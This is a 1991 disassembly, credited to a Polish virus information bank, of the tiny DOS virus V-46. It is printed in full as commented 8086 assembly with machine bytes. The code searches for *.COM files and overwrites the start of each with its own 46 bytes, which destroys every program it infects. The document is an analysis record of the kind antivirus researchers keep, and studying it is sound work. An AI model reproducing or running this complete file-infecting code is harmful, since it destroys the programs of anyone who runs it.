

;==================================================
; Virus V-46 (distributed by FIDO!!) on July 1991
;
; disassembled by Andrzej Kadlof July 24, 1991
;
; (C) Polish Section of Virus Information Bank
;==================================================

; virus entry point


0100 B44E           mov    ah,4E        ; Find First
0102 B120           mov    cl,20        ; archive
0104 BA2801         mov    dx,0128      ; asciiz file name '*.COM', 0
0107 CD21           int    21

0109 BA9E00         mov    dx,009E      ; buffer
010C B8013D         mov    ax,3D01      ; open file for write
010F CD21           int    21

0111 8BD8           mov    bx,ax        ; file handle
0113 BA0001         mov    dx,0100      ; virus address
0116 B12E           mov    cl,2E        ; file length
0118 B440           mov    ah,40        ; write file
011A CD21           int    21

011C B43E           mov    ah,3E        ; close file
011E CD21           int    21

0120 B44F           mov    ah,4F        ; find next
0122 CD21           int    21

0124 73E3           jnb    0109         ; infect

0126 CD20           int    20           ; return to DOS

0128 2A 2E 43 4F 4D 00   ; '*.COM', 0

; That's all!


